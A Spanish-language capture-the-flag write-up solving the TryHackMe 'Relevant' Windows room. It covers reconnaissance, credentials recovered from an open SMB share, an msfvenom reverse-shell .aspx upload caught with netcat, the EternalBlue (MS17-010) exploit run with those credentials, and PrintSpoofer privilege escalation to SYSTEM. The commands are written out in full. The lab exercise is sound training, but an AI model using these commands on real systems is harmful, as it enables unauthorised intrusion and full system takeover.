---
title: Relevant Writeup - TryHackMe
date: 2023-04-03
categories: [Writeup, THM]
tags: [Linux, THM, CTF, Medium, MS17-010, Eternal Blue, SeImpersonatePrivilege]
img_path: /assets/img/commons/relevant/
image: relevant.jpeg
---

¡Hola!

En este writeup, exploraremos la sala [**Relevant**](https://tryhackme.com/room/relevant) de TryHackMe, de dificultad media según la plataforma. A través de esta sala, explotaremos una máquina Windows en un entorno de pruebas realista. Debido a que se trata de una prueba tipo "black box", no se proporcionará información adicional para resolver el desafío. Cabe destacar que esta sala cuenta con más de una ruta para comprometer el sistema, y en este writeup se explorarán dos posibles vías de ataque.

¡Empecemos!

## Reconocimiento activo

---

Como primer paso, lanzamos el comando `ping` desde nuestro equipo atacante para verificar si la máquina objetivo está activa.

```bash
❯ ping -c 1 10.10.108.218
PING 10.10.108.218 (10.10.108.218) 56(84) bytes of data.
64 bytes from 10.10.108.218: icmp_seq=1 ttl=125 time=316 ms

--- 10.10.108.218 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 316.489/316.489/316.489/0.000 ms
```

Dado que el `TTL` es cercano a 128, podemos inferir que la máquina objetivo probablemente este ejecutando un SO Windows.

## Escaneo

---

A continuación, realizamos un escaneo con `Nmap` para identificar los puertos abiertos en el sistema objetivo.

```bash
❯ nmap -p- --open -n -sS -Pn --min-rate 5000 10.10.108.218 -oG allPorts.txt
```

Donde:

- `-p-`: indica que se escaneen todos los puertos posibles (65535) del objetivo.
- `--open`: indica que se muestren solo los puertos abiertos, ignorando los cerrados o filtrados.
- `-n`: indica que no se haga resolución DNS.
- `-sS`: indica que se use el tipo de escaneo TCP SYN.
- `--min-rate 5000`: indica que se envíen al menos 5000 paquetes por segundo.
- `10.10.108.218`: indica la dirección IP del objetivo a escanear.
- `-oG allPorts.txt`: indica que se guarde el resultado del escaneo en formato grepeable en el archivo allPorts.txt.

```bash
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-03 18:29 -05
Nmap scan report for 10.10.108.218
Host is up (0.33s latency).
Not shown: 65529 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
49663/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 41.19 seconds
```

Vemos que hay varios puertos habilitados, entre ellos el `80 (HTTP)`, `3389 (RDP)`, `139` y `445 (SMB)`, `135 (RPC)` y otro de carácter desconocido de momento.

## Enumeración

---

Seguidamente, efectuamos una enumeración de las versiones de los servicios asociados a los puertos abiertos. Además, activamos los scripts predeterminados de `Nmap` para realizar pruebas complementarias sobre los puertos y servicios identificados, con el propósito de obtener más información sobre la configuración y posibles vulnerabilidades del sistema objetivo.

```bash
❯ nmap -p 80,135,139,445,3389,49663 -sV -sC --min-rate 5000 10.10.108.218 -oN services.txt
```

Donde:

- `-p 21,22,139,445,3128,3333`: indica que se escaneen solo los puertos especificados del objetivo.
- `-sV`: indica que se sondeen los puertos abiertos para determinar la información de servicio y versión.
- `-sC`: indica que se ejecute el script por defecto de Nmap, que realiza varias pruebas comunes como detección de vulnerabilidades o enumeración de recursos.
- `--min-rate 5000`: indica que se envíen al menos 5000 paquetes por segundo.
- `10.10.108.218`: indica la dirección IP del objetivo a escanear.
- `-oN services.txt`: indica que se guarde el resultado del escaneo en formato normal (fácil de leer por humanos) en el archivo services.txt.

```bash
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-03 18:31 -05
Nmap scan report for 10.10.108.218
Host is up (0.32s latency).

PORT      STATE SERVICE        VERSION
80/tcp    open  http           Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
135/tcp   open  msrpc          Microsoft Windows RPC
139/tcp   open  netbios-ssn    Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds   Windows Server 2016 Standard Evaluation 14393 microsoft-ds
3389/tcp  open  ms-wbt-server?
|_ssl-date: 2023-04-03T23:34:09+00:00; -1s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: RELEVANT
|   NetBIOS_Domain_Name: RELEVANT
|   NetBIOS_Computer_Name: RELEVANT
|   DNS_Domain_Name: Relevant
|   DNS_Computer_Name: Relevant
|   Product_Version: 10.0.14393
|_  System_Time: 2023-04-03T23:33:31+00:00
| ssl-cert: Subject: commonName=Relevant
| Not valid before: 2023-04-02T23:25:24
|_Not valid after:  2023-10-02T23:25:24
49663/tcp open  http           Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: IIS Windows Server
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: 1h24m00s, deviation: 3h07m51s, median: 0s
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard Evaluation 14393 (Windows Server 2016 Standard Evaluation 6.3)
|   Computer name: Relevant
|   NetBIOS computer name: RELEVANT\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2023-04-03T16:33:31-07:00
| smb2-time: 
|   date: 2023-04-03T23:33:33
|_  start_date: 2023-04-03T23:25:58

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 136.32 seconds
```

Dentro de los aspectos más destacados del informe, podemos señalar que es posible que el sistema operativo de la máquina objetivo sea `Windows Server 2016 Standard Evaluation`. Además, tanto en el puerto 80 como en el 49663, se ejecuta un servicio `IIS Windows Server`.

### HTTP - 80

Tras identificar un servicio HTTP en el puerto 80, exploramos el contenido de la página web. Como vemos se trata de una página por defecto de Internet Information Services (IIS).

![web](web.png)

Inspeccionamos el código fuente de la página web y realizamos un fuzzing de directorios, sin embargo, no identificamos ninguna información relevante.

### HTTP - 49663

Tras explorar el contenido de la página web que se ejecuta en el puerto `49663`, determinamos que se trata del mismo sitio web que en el puerto `80`. A pesar de inspeccionar el código fuente de la página web, no encontramos información relevante. A continuación procedemos a realizar nuevamente fuzzing de directorios utilizando `wfuzz`.

```bash
wfuzz -c -L -t 400 --hc=200,301 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.108.218:49663/FUZZ
```

Donde:

- `-c`: muestra la salida con colores.
- `-L`: sigue las redirecciones HTTP.
- `-t 400`: establece el número de hilos concurrentes a 400.
- `–hc=404`: oculta las respuestas HTTP con los códigos 404.
- `-w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`: usa el archivo indicado como diccionario de palabras para el fuzzing.
- `http://10.10.108.218:49663/FUZZ`: usa la URL indicada como objetivo del fuzzing, reemplazando la palabra FUZZ por cada palabra del diccionario.

En este caso, tras esperar un tiempo considerable, logramos identificar el directorio `nt4wrksv`, asi que nos dirigimos a él para inspeccionarlo. Al acceder, comprobamos que el directorio existe como tal, pero no presenta ningún contenido.

![nt4wrksv](nt4wrksv.png)

Después de identificar este directorio sospechoso, dejamos de lado la enumeración web y ahora nos enfocamos en la enumeración del servicio **SMB**.

### SMB - 445/139

A continuación, procedemos a realizar la enumeración del servicio SMB. En primer lugar, listamos los recursos compartidos con `smbclient` sin proporcionar contraseñas y encontramos el recurso compartido `nt4wrksv`, el cual curiosamente tiene el mismo nombre que el directorio encontrado previamente.

```bash
❯ smbclient -L //10.10.108.218 -N

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	nt4wrksv        Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.108.218 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

A continuación, nos conectamos al recurso compartido y descubrimos un archivo llamado `passwords.txt`. Procedemos a descargarlo para su posterior inspección.

```bash
❯ smbclient //10.10.108.218/nt4wrksv -N
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Jul 25 16:46:04 2020
  ..                                  D        0  Sat Jul 25 16:46:04 2020
  passwords.txt                       A       98  Sat Jul 25 10:15:33 2020

		7735807 blocks of size 4096. 4945841 blocks available
smb: \> get passwords.txt 
getting file \passwords.txt of size 98 as passwords.txt (0,0 KiloBytes/sec) (average 0,0 KiloBytes/sec)
```

Leemos el contenido del archivo y encontramos un par de contraseñas codificadas en lo que parece ser `base64`.

```bash
❯ cat passwords.txt
───────┬──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: passwords.txt
───────┼──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ [User Passwords - Encoded]
   2   │ Qm9iIC0gIVBAJCRXMHJEITEyMw==
   3   │ QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk
───────┴──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

Realizamos la decodificación con la herramienta `base64` y obtenemos los usuarios y contraseñas en texto plano.

```bash
❯ echo 'Qm9iIC0gIVBAJCRXMHJEITEyMw==' | base64 -d; echo
Bob - !P@$$W0rD!123
❯ echo 'QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk' | base64 -d; echo
Bill - Juw4nnaM4n420696969!$$$
```

> El `echo` del final se emplea dado que la cadena resultante no contiene salto de línea al final, quedando el prompt de Linux pegado a esta. Puedes corroborarlo eliminando dicho comando.
{: .prompt-info }

Intentamos iniciar sesión en la máquina a través del servicio RDP, sin embargo, no obtuvimos éxito en nuestros intentos.

## Análisis de vulnerabilidades

---

A continuación, procedemos a realizar un escaneo de vulnerabilidades conocidas asociadas al servicio SMB mediante el uso de los scripts `smb-vuln*` de `Nmap`.

```bash
❯ nmap -p 445,139 --script 'smb-vuln*' -T4 -Pn 10.10.108.218
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-03 19:24 -05
Nmap scan report for 10.10.108.218
Host is up (0.31s latency).

PORT    STATE SERVICE
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Host script results:
|_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug)
|_smb-vuln-ms10-054: false
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/

Nmap done: 1 IP address (1 host up) scanned in 17.16 seconds
```

El informe indica que el sistema presenta una vulnerabilidad conocida como **MS17-010** o **EternalBlue**.

## Explotación

---

En este punto, hemos identificado dos posibles vectores de ataque para acceder a la máquina. Por un lado, dado que el directorio encontrado durante el fuzzing de directorios (`nt4wrksv`) tiene el mismo nombre que el recurso compartido a través de SMB, podemos inferir que existe una conexión directa entre los recursos del servicio HTTP (puerto 49663) y SMB. Por otro lado, podemos intentar explotar la conocida vulnerabilidad **MS17-010** o **EternalBlue** para acceder al equipo. En este contexto, se presentan a continuación dos métodos diferentes para acceder a esta máquina.

### Explotación de HTTP en el puerto 49663 y SMB Open Share

Como mencionamos anteriormente, existe una posible conexión entre los servicios HTTP y SMB. Por lo tanto, intentamos verificar si esto era cierto accediendo directamente al archivo `passwords.txt`, que se encontraba en el recurso compartido `nt4wrksv`, a través de la página web que corría en el puerto 49663.

![passwords](passwords.png)

Al comprobar que es posible acceder al recurso, se evidencia que el servidor web utiliza en realidad el mismo directorio que el recurso compartido SMB.

Este hallazgo nos acerca más al objetivo de acceder al sistema, ya que hemos descubierto una posible vía para subir una shell inversa y obtener acceso inicial al servidor. Con el fin de probar esta hipótesis, podemos utilizar el comando **put** para subir un archivo de prueba al recurso compartido SMB.

```bash
smb: \> put test.txt 
putting file test.txt as \test.txt (0,0 kb/s) (average 0,0 kb/s)
```

Una vez subido el archivo al servidor, intentamos acceder a él a través del navegador web.

![test](test.png)

Como se puede observar, hemos confirmado la posibilidad de subir y leer archivos en el servidor, lo cual nos permite utilizar una reverse shell para obtener acceso a la máquina. Dado que el servidor es un IIS, es común utilizar el formato `.aspx` para atacar servidores IIS. Por lo tanto, procedemos a crear un payload con extensión `.aspx` mediante la herramienta `MSF Venom`, utilizando el siguiente comando:

```bash
❯ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.2.11.100 LPORT=443 -f aspx > shell.aspx
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of aspx file: 3419 bytes
```

Una vez que hemos creado el payload, lo subimos al servidor mediante el mismo proceso que usamos para subir el archivo de prueba.

```bash
❯ smbclient //10.10.95.131/nt4wrksv -N
Try "help" to get a list of possible commands.
smb: \> put shell.aspx
putting file shell.aspx as \shell.aspx (1,8 kb/s) (average 1,8 kb/s)
smb: \> ls
  .                                   D        0  Mon Apr  3 20:14:04 2023
  ..                                  D        0  Mon Apr  3 20:14:04 2023
  passwords.txt                       A       98  Sat Jul 25 10:15:33 2020
  shell.aspx                          A     3419  Mon Apr  3 20:14:06 2023
  test.txt                            A        5  Mon Apr  3 20:01:57 2023

		7735807 blocks of size 4096. 4945288 blocks available
```

Después de cargar el payload al servidor, nos ponemos en escucha en el puerto especificado en el payload (443) y lo ejecutamos desde el navegador mediante la dirección completa `http://10.10.95.131:49663/nt4wrksv/shell.aspx`.

```bash
❯ rlwrap nc -nlvp 443
listening on [any] 443 ...
connect to [10.2.11.100] from (UNKNOWN) [10.10.95.131] 49811
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

c:\windows\system32\inetsrv>whoami
whoami
iis apppool\defaultapppool
```

Inmediatamente obtenemos una shell como usuario `defaulttapppool`. En este punto ya podemos leer la flag del usuario ubicada en la ruta `c:\Users\Bob\Desktop`.

```bash
c:\Users\Bob\Desktop>type user.txt
type user.txt
THM{fdk4ka34vk346k****************}
```

### Eternal Blue - AutoBlue-MS17-010

Como la máquina víctima tiene la vulnerabilidad MS17-010 que detectamos en el análisis de vulnerabilidades, podemos usar el script [AutoBlue-MS17-010](https://github.com/3ndG4me/AutoBlue-MS17-010) para explotar esta vulnerabilidad.

Según las indicaciones en el repositorio de GitHub, para obtener una shell como `SYSTEM` hay que indicar la dirección IP de la máquina víctima, el puerto SMB y las credenciales válidas para autenticarse.

Entonces empezaremos clonando el repositorio.

```bash
git clone https://github.com/3ndG4me/AutoBlue-MS17-010.git
```

Para que el exploit tenga éxito, es necesario utilizar los siguientes parámetros:

- `target-ip` — para especificar la dirección IP de la máquina Windows vulnerable
- `port` — para especificar el puerto SMB en uso
- Las credenciales para conectarse con un usuario especifico, en este caso utilizando las credenciales del usuario `bob`.

Nos dirigimos al repositorio clonado y ejecutamos el exploit con los parámetros previamente mencionados.

```bash
❯ python zzz_exploit.py -target-ip 10.10.95.131 -port 445 'bob:!P@$$W0rD!123@10.10.95.131'
[*] Target OS: Windows Server 2016 Standard Evaluation 14393
[+] Found pipe 'netlogon'
[+] Using named pipe: netlogon
[*] Target is 64 bit

[...]

[+] success controlling groom transaction
[*] modify trans1 struct for arbitrary read/write
[*] make this SMB session to be SYSTEM
[*] overwriting session security context
[*] have fun with the system smb session!
[!] Dropping a semi-interactive shell (remember to escape special chars with ^) 
[!] Executing interactive programs will hang shell!
C:\Windows\system32>whoami
nt authority\system
```

Con esta acción, hemos obtenido un shell con los privilegios del usuario `SYSTEM`, por lo que no es necesario realizar una escalada de privilegios a través de este método de explotación.

## Escalación de privilegios

---

### **Abuso de token SeImpersonatePrivilege**

Una vez que se ha obtenido una shell como el usuario `defaulttapppool` mediante el primer método, buscamos posibles vías de escalada de privilegios a usuario `SYSTEM`. Comenzamos listando los privilegios con los que cuenta el usuario actual.

```bash
c:\windows\system32\inetsrv>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

El resultado indica que el token `SeImpersonatePrivilege` está activo. Según el artículo [Abusing Tokens](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens) de **HackTricks**, existen diferentes formas de aprovecharlo utilizando herramientas como [juicy-potato](https://github.com/ohpe/juicy-potato)**,** [RogueWinRM](https://github.com/antonioCoco/RogueWinRM)**,** [SweetPotato](https://github.com/CCob/SweetPotato) **y** [PrintSpoofer](https://github.com/itm4n/PrintSpoofer).

En este caso, utilizamos la herramienta [PrintSpoofer](https://github.com/dievus/printspoofer) ya compilada y empezaremos clonando el repositorio.

```bash
git clone https://github.com/dievus/printspoofer.git
```

Una vez ubicados en el directorio clonado, procedemos a conectarnos nuevamente al recurso compartido `nt4wrksv` para subir el ejecutable `PrintSpoofer.exe`.

```bash
❯ smbclient //10.10.95.131/nt4wrksv -N
Try "help" to get a list of possible commands.
smb: \> put PrintSpoofer.exe 
putting file PrintSpoofer.exe as \PrintSpoofer.exe (18,5 kb/s) (average 18,5 kb/s)
smb: \> ls
  .                                   D        0  Mon Apr  3 20:37:03 2023
  ..                                  D        0  Mon Apr  3 20:37:03 2023
  passwords.txt                       A       98  Sat Jul 25 10:15:33 2020
  PrintSpoofer.exe                    A    27136  Mon Apr  3 20:37:04 2023
  shell.aspx                          A     3419  Mon Apr  3 20:14:06 2023
  test.txt                            A        5  Mon Apr  3 20:01:57 2023

		7735807 blocks of size 4096. 4935427 blocks available
```

Ahora desde la máquina víctima, realizamos una búsqueda recursiva del directorio donde se subió el ejecutable.

```bash
c:\>dir PrintSpoofer.exe /s /b
dir PrintSpoofer.exe /s /b
c:\inetpub\wwwroot\nt4wrksv\PrintSpoofer.exe
```

Con la ruta del archivo identificada, ejecutamos `PrintSpoofer.exe` en la máquina víctima y obtenemos una shell como `SYSTEM`.

```bash
c:\>\inetpub\wwwroot\nt4wrksv\PrintSpoofer.exe -i -c cmd
```

Donde

- `-i`: Indica que se interactue con el nuevo proceso en el símbolo del sistema actual.
- `-c cmd`: Indica que se ejecute el comando *CMD.*

```bash
\inetpub\wwwroot\nt4wrksv\PrintSpoofer.exe -i -c cmd
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```

Finalmente, podemos leer la flag root en la ruta `c:\Users\Administrator\Desktop`.

```bash
c:\Users\Administrator\Desktop>type root.txt
type root.txt
THM{1fk5kf469devly****************}
```

¡Happy Hacking!
